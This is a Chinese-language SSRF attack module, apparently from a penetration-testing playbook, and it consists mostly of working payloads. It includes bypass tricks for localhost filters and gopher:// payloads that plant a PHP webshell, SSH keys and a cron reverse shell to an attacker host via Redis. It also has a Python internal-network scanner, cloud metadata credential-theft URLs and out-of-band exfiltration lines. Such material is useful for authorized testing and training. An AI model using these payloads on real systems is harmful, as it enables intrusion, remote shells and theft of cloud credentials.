# SSRF 服务端请求伪造模块

## 适用场景
- URL 参数（如 url=、file=、link=）
- 图片加载、文件下载功能
- 在线翻译、网页代理、Webhook

## 检查清单

```yaml
协议支持:
  - [ ] http/https
  - [ ] file://
  - [ ] gopher://
  - [ ] dict://
  - [ ] ftp://
  - [ ] ldap://

内网探测:
  - [ ] 127.0.0.1 本机
  - [ ] 10.0.0.0/8 内网
  - [ ] 172.16.0.0/12 内网
  - [ ] 192.168.0.0/16 内网
  - [ ] 169.254.169.254 云元数据

利用目标:
  - [ ] Redis 未授权
  - [ ] MySQL 未授权
  - [ ] FastCGI
  - [ ] 内网 Web 服务
  - [ ] 云服务元数据
```

## 分析流程

### Step 1: SSRF 检测

```bash
# 基础测试
?url=http://127.0.0.1
?url=http://localhost
?url=http://[::1]

# 使用外部服务检测
?url=http://你的VPS:端口/
?url=http://你的.dnslog.cn/

# 检测协议支持
?url=file:///etc/passwd
?url=dict://127.0.0.1:6379/info
?url=gopher://127.0.0.1:6379/_test
```

### Step 2: 常见绕过技巧

#### IP 绕过

```bash
# 127.0.0.1 的各种表示
http://127.0.0.1
http://localhost
http://127.1
http://127.0.1
http://0
http://0.0.0.0
http://[::1]
http://[0:0:0:0:0:0:0:1]

# 进制转换
http://2130706433      # 十进制
http://0x7f000001      # 十六进制
http://017700000001    # 八进制

# 特殊域名
http://127.0.0.1.nip.io
http://127.0.0.1.xip.io
http://any.127.0.0.1.xip.io
http://localtest.me   # 解析到 127.0.0.1

# 封闭式字母数字
http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ
# Unicode 字符

# 重定向
http://attacker.com/redirect?url=http://127.0.0.1
```

#### URL 绕过

```bash
# @ 绕过
http://google.com@127.0.0.1
http://127.0.0.1#@google.com

# URL 编码
http://%31%32%37%2e%30%2e%30%2e%31

# CRLF 注入
http://127.0.0.1%0d%0aHOST:attacker.com

# 畸形 URL
http://127。0。0。1
http://127.0.0.1／
http://127.0.0.1:80\@google.com

# 短网址
http://短网址 -> http://127.0.0.1
```

#### DNS 重绑定

```python
#!/usr/bin/env python3
"""
DNS 重绑定攻击
第一次解析返回合法 IP，第二次返回 127.0.0.1
"""

# 使用在线服务
# http://ceye.io/
# http://rbndr.us/

# 原理:
# 1. 目标服务器验证 URL 是否指向白名单域名
# 2. 第一次 DNS 解析返回合法 IP，通过验证
# 3. 实际请求时，DNS 已切换到内网 IP
# 4. 目标服务器请求到内网资源
```

### Step 3: 协议利用

#### file:// 协议

```bash
# 读取本地文件
?url=file:///etc/passwd
?url=file:///etc/hosts
?url=file:///proc/net/arp
?url=file:///var/www/html/config.php

# Windows
?url=file:///C:/Windows/win.ini
?url=file:///C:/Windows/System32/drivers/etc/hosts
```

#### gopher:// 协议

```bash
# Gopher 可以构造任意 TCP 数据包
# 格式: gopher://IP:PORT/_payload

# 攻击 Redis
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0a%0a%3c%3fphp%20system%28%24_GET%5b%27cmd%27%5d%29%3b%20%3f%3e%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a

# URL 编码后的 Redis 命令:
# FLUSHALL
# SET 1 "\n\n<?php system($_GET['cmd']); ?>\n\n"
# CONFIG SET dir /var/www/html
# CONFIG SET dbfilename shell.php
# SAVE
```

#### dict:// 协议

```bash
# 用于探测端口和服务
?url=dict://127.0.0.1:6379/info
?url=dict://127.0.0.1:22/
?url=dict://127.0.0.1:3306/

# 向 Redis 发送命令
?url=dict://127.0.0.1:6379/slaveof:attacker.com:6379
```

### Step 4: 内网探测

```python
#!/usr/bin/env python3
"""
SSRF 内网扫描脚本
"""

import requests
import concurrent.futures

base_url = "http://target.com/fetch.php?url="

# 常见内网 IP 段
ip_ranges = [
    ("127.0.0", 1, 1),
    ("192.168.0", 1, 255),
    ("192.168.1", 1, 255),
    ("10.0.0", 1, 255),
    ("172.16.0", 1, 255),
]

# 常见端口
ports = [22, 80, 443, 6379, 3306, 8080, 8443, 9000]

def scan(ip, port):
    """扫描单个 IP:端口"""
    url = f"{base_url}http://{ip}:{port}/"
    try:
        resp = requests.get(url, timeout=5)
        if resp.status_code == 200 and len(resp.content) > 0:
            print(f"[+] Found: {ip}:{port}")
            return (ip, port, True)
    except:
        pass
    return (ip, port, False)

# 多线程扫描
with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
    futures = []
    for prefix, start, end in ip_ranges:
        for i in range(start, end + 1):
            ip = f"{prefix}.{i}"
            for port in ports:
                futures.append(executor.submit(scan, ip, port))
```

### Step 5: 攻击内网服务

#### 攻击 Redis

```python
#!/usr/bin/env python3
"""
SSRF 攻击 Redis 生成 payload
"""

import urllib.parse

def generate_redis_payload(cmd_list, host="127.0.0.1", port=6379):
    """生成攻击 Redis 的 Gopher payload"""
    payload = ""
    for cmd in cmd_list:
        args = cmd.split(" ")
        payload += f"*{len(args)}\r\n"
        for arg in args:
            payload += f"${len(arg)}\r\n{arg}\r\n"
    
    # URL 编码
    encoded = urllib.parse.quote(payload).replace("%0A", "%0D%0A")
    return f"gopher://{host}:{port}/_{encoded}"

# 写 WebShell
cmds = [
    "flushall",
    'set 1 "\n\n<?php system($_GET[cmd]); ?>\n\n"',
    "config set dir /var/www/html",
    "config set dbfilename shell.php",
    "save"
]

print(generate_redis_payload(cmds))

# 写 SSH 公钥
ssh_key = "ssh-rsa AAAAB3... user@host"
cmds2 = [
    "flushall",
    f'set 1 "\n\n{ssh_key}\n\n"',
    "config set dir /root/.ssh",
    "config set dbfilename authorized_keys",
    "save"
]

print(generate_redis_payload(cmds2))

# 写定时任务
cmds3 = [
    "flushall",
    'set 1 "\n\n*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1\n\n"',
    "config set dir /var/spool/cron",
    "config set dbfilename root",
    "save"
]

print(generate_redis_payload(cmds3))
```

#### 攻击 FastCGI

```python
#!/usr/bin/env python3
"""
SSRF 攻击 FastCGI 生成 payload
"""

import socket
import urllib.parse

def generate_fastcgi_payload(cmd="/bin/id"):
    """生成攻击 FastCGI 的 payload"""
    # FastCGI 参数
    params = {
        'GATEWAY_INTERFACE': 'FastCGI/1.0',
        'REQUEST_METHOD': 'GET',
        'SCRIPT_FILENAME': '/var/www/html/index.php',
        'SCRIPT_NAME': '/index.php',
        'QUERY_STRING': '',
        'REQUEST_URI': '/index.php',
        'DOCUMENT_ROOT': '/var/www/html',
        'SERVER_SOFTWARE': 'php/fcgiclient',
        'REMOTE_ADDR': '127.0.0.1',
        'REMOTE_PORT': '9999',
        'SERVER_ADDR': '127.0.0.1',
        'SERVER_PORT': '80',
        'SERVER_NAME': 'localhost',
        'SERVER_PROTOCOL': 'HTTP/1.1',
        'PHP_VALUE': f'auto_prepend_file = php://input\n'
                     f'allow_url_include = On',
        'PHP_ADMIN_VALUE': f'open_basedir = /',
    }
    
    # ... (完整实现参考 Gopherus 工具)
    return "gopher://127.0.0.1:9000/_<payload>"

# 使用 Gopherus 工具更方便
# python gopherus.py --exploit fastcgi
```

### Step 6: 云服务元数据

```bash
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# Google Cloud
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/instance/

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01

# Digital Ocean
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/hostname

# 阿里云
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/ram/security-credentials/

# 腾讯云
http://metadata.tencentyun.com/latest/meta-data/
```

## 常见套路与解法

### 套路 1: 过滤 127.0.0.1

```bash
# 进制转换
http://2130706433
http://0x7f.0x0.0x0.0x1
http://017700000001

# 特殊表示
http://127.1
http://0.0.0.0
http://[::1]

# DNS
http://内网域名
```

### 套路 2: 过滤 file://

```bash
# 大小写
file://
File://
FILE://

# 编码
%66%69%6c%65://
```

### 套路 3: 限制域名

```bash
# @ 绕过
http://允许的域名@内网IP/

# 开放重定向
http://允许的域名/redirect?url=http://内网IP
```

### 套路 4: 无回显 SSRF

```bash
# DNS 外带
?url=http://`whoami`.你的域名.dnslog.cn

# HTTP 外带
?url=http://你的VPS/?data=...

# 利用 dict 协议探测
?url=dict://127.0.0.1:端口/
# 通过响应时间判断端口是否开放
```

## 工具速查

```bash
# Gopherus - 生成 Gopher payload
python gopherus.py --exploit redis
python gopherus.py --exploit fastcgi
python gopherus.py --exploit mysql

# SSRF 检测
# Burp Collaborator
# http://webhook.site
# http://requestbin.net

# 内网扫描
# 使用脚本批量探测
```
